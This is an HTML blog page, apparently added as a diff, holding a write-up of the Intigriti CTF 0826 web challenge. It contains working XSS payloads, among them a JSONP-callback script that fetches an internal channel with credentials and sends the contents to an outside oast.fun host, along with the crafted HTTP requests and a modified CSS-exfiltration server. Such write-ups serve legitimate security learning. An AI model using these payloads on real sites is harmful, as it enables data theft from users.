@@ -1,0 +1,148 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intigriti Ctf 0826</title>
+    <link href="/static/favicon.ico" rel="icon"/>
+    <link href="/static/prism.css" rel="stylesheet"/>
+    <link href="/static/style.css" rel="stylesheet"/>
+</head>
+<body>
+
+<header>
+    <a href="/html/about.html"><img class="profile-pic" src="https://avatars.githubusercontent.com/u/122540000?v=4" alt="profile-pic"></a>
+    <a class="header" href="/html/about.html"><h1>Reab:~$<span class="cursor">▋</span></h1></a>
+    <div class="navs">
+        <h1><a class="header" href="/html/about.html">About</a></h1>
+        <h1><a class="header" href="/html/blog/index.html">Blog</a></h1>
+        <h1><a class="header" href="/html/personal/index.html">Personal</a></h1>
+        <h1><a class="header" href="/html/projects/index.html">Projects</a></h1>
+    </div>
+</header>
+
+<div class="global-content">
+<div class="inner-content">
+
+<!-- content start -->
+<h1>Intigriti CTF 0826</h1>
+
+<p>Writeup in <a href="https://youtu.be/m_OCO0yNn9E?si=9y2Kg7bHvfgzVKyz">video format</a>.</p>
+
+<p>Exploring the report endpoint.
+At first I got an out of bounds callback when using my server as a <code>src</code> for an html <code>img</code> tag.</p>
+
+<pre><code class="http language-http">POST /api/report HTTP/1.1
+Host: challenge-0826.challenges.intigriti.io
+Connection: keep-alive
+X-Channel-Id: 1337&gt;&lt;img src='https://webhook.site/39948591-4103-44d0-8e58-662429d7a5bc?test=4'&gt;
+Content-Length: 12
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=dbc1fcc2de47fe3988516229e471b4e5; tk_or=%22https%3A%2F%2Fchallenge-0826.challenges.intigriti.io%2F%22; tk_r3d=%22https%3A%2F%2Fchallenge-0826.challenges.intigriti.io%2F%22; tk_lr=%22https%3A%2F%2Fchallenge-0826.challenges.intigriti.io%2F%22
+
+channelId=1337&gt;&lt;img src='https://webhook.site/xD?test=3'&gt;
+</code></pre>
+
+<p>Basic XSS payloads failed to callback, so I eventually tried other methods like CSS oracles.
+After some research I found https://github.com/hackvertor/blind-css-exfiltration from Gareth Heyes.</p>
+
+<p>The script <code>css-exfiltrator-server.js</code> was changed a bit to include more html tags and to prevent a weird stack overflow in chrome from (don't ask how xD): </p>
+
+<pre><code class="js language-js">const ELEMENTS = ["input","textarea","form","a","img","video","source","meta","link","script"] //["input","textarea","form","a"];
+//const ATTRIBUTES = {__proto__:null,"input":["value","name"],"textarea":["name"],"form":["action"],"a":["href"]};
+const ATTRIBUTES = {
+    __proto__:null,
+    "input":["value","name","src"],
+    "textarea":["name"],
+    "form":["action"],
+    "a":["href"],
+    "img":["src"],
+    "video":["src"],
+    "source":["src"],
+    "meta":["content"],
+    "link":["href"],
+    "script":["src"]
+};
+const MAX_ELEMENTS = 20; // 20
+const MAX_VALUE = 50; // 200
+const WAIT_TIME_MS = 1000; // 500
+</code></pre>
+
+<p>After running the server with <code>node css-exfiltrator-server.js</code>, I sent this POST request, it allowed me to see how my XSS payloads are reflecting.</p>
+
+<pre><code class="http language-http">POST /api/report HTTP/1.1
+Host: challenge-0826.challenges.intigriti.io
+Connection: keep-alive
+Content-Length: 12
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Origin: https://challenge-0826.challenges.intigriti.io
+Referer: https://challenge-0826.challenges.intigriti.io/challenge
+Cookie: tk_or=%22https%3A%2F%2Fchallenge-0826.challenges.intigriti.io%2F%22; tk_lr=%22https%3A%2F%2Fchallenge-0826.challenges.intigriti.io%2F%22; session=ad15ce9e7434e34e02f86d87d5afb97f
+
+channelId=1&lt;img src='x' onerror='fetch("/")'&gt;&lt;style&gt;@import'//myserver/start';&lt;/style&gt;
+</code></pre>
+
+<p><img src="/static/CSS_oracle_1.png" alt="cssexfil1" /></p>
+
+<p>As you can see, event attribute <code>onerror</code> was sanitized, and since <code>src</code> was not I tried with:
+<code>channelId=1&lt;script src='/xd'&gt;&lt;/script&gt;&lt;style&gt;@import'//YOUR_SERVER/start';&lt;/style&gt;</code></p>
+
+<p><img src="/static/CSS_oracle_2.png" alt="cssexfil2" /></p>
+
+<p>Which was not sanitized, but the execution likely got blocked by browser security policy, because the script is from a different origin, unless I could find a way to have same origin script.</p>
+
+<p>After some research and brute-forcing the paths, I found a way to have same origin script source via depreciated practice in web dev, in <code>/api/jsonp?callback=reflected_val</code>.
+So constructing an XSS payload for returning the output of internal request to channel 11 - as per hint on twitter.</p>
+
+<pre><code class="js language-js">fetch('/api/channels/11/load', {credentials: 'include'})
+    .then(r =&gt; r.text())
+    .then(text =&gt; document.createElement('img').src = `//eellryulkexbgwvamkwpmommmz8608j1l.oast.fun/${encodeURIComponent(text)}`);//
+</code></pre>
+
+<p>Then URL encode the JS for safe transport:</p>
+
+<pre><code class="js language-js">fetch%28%27%2Fapi%2Fchannels%2F11%2Fload%27%2C%20%7Bcredentials%3A%20%27include%27%7D%29%0D%0A%09%2Ethen%28r%20%3D%3E%20r%2Etext%28%29%29%0D%0A%09%2Ethen%28text%20%3D%3E%20document%2EcreateElement%28%27img%27%29%2Esrc%20%3D%20%60%2F%2Feellryulkexbgwvamkwpmommmz8608j1l%2Eoast%2Efun%2F%24%7BencodeURIComponent%28text%29%7D%60%29%3B%2F%2F
+</code></pre>
+
+<p>And finally send the payload in the <code>callback</code> parameter of <code>jsonp</code> in the <code>src</code> parameter of the <code>script</code> tag.</p>
+
+<pre><code class="http language-http">POST /api/report HTTP/1.1
+Host: challenge-0826.challenges.intigriti.io
+...
+
+channelId=01&lt;script src="/api/jsonp?callback=fetch%28%27%2Fapi%2Fchannels%2F11%2Fload%27%2C%20%7Bcredentials%3A%20%27include%27%7D%29%0D%0A%09%2Ethen%28r%20%3D%3E%20r%2Etext%28%29%29%0D%0A%09%2Ethen%28text%20%3D%3E%20document%2EcreateElement%28%27img%27%29%2Esrc%20%3D%20%60%2F%2Feellryulkexbgwvamkwpmommmz8608j1l%2Eoast%2Efun%2F%24%7BencodeURIComponent%28text%29%7D%60%29%3B%2F%2F"&gt;&lt;/script&gt;
+</code></pre>
+
+<p>When the XSS executes, my server logs a GET request from <code>3.251.43.33</code>,  with file name which we can use instead of <code>static.mp4</code> we had before on the broken TV.</p>
+
+<pre><code class="http language-http">GET /3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
+</code></pre>
+
+<p>Then simply fetching the video from the <code>/static/streams/3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4</code> yields the flag!
+<code>INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}</code></p>
+
+<p><img src="/static/flag_0826.png" alt="flag" /></p>
+
+<!-- content end -->
+
+</div></div>
+
+<footer>
+    <div class="socials">
+        <p class="faint">©2026 Author: Mihajlo Frančić<br>
+        <a class="email" href="mailto:mihajlofrancic@gmail.com">mihajlofrancic@gmail.com</a></p>
+    </div>
+    <div class="socials">
+        </a><a href=https://github.com/0Reab><img class="socials" src=https://cdn.simpleicons.org/github/dbdbdb>
+        </a><a href=https://www.linkedin.com/in/mihajlo-francic-3650682bb><img class="socials" src=https://img.icons8.com/?size=100&id=8808&format=png&color=FDFDFD class=inline style=width:17px;height:17px;>
+        </a><a href=https://www.instagram.com/astrosamihajlom/><img class="socials" src=https://cdn.simpleicons.org/instagram/dbdbdb class=inline>
+        </a><a href=https://app.intigriti.com/researcher/profile/reab><img class="socials" src=https://cdn.simpleicons.org/intigriti/ffffff class=inline>
+        </a><a href=https://www.openbugbounty.org/researchers/reab/><img class="socials" src=https://cdn.simpleicons.org/openbugbounty/dbdbdb class=inline>
+    </div>
+</footer>
+
+<script src="/js/prism.js"></script>
+<script src="/js/main.js"></script>
+</body>
+</html>
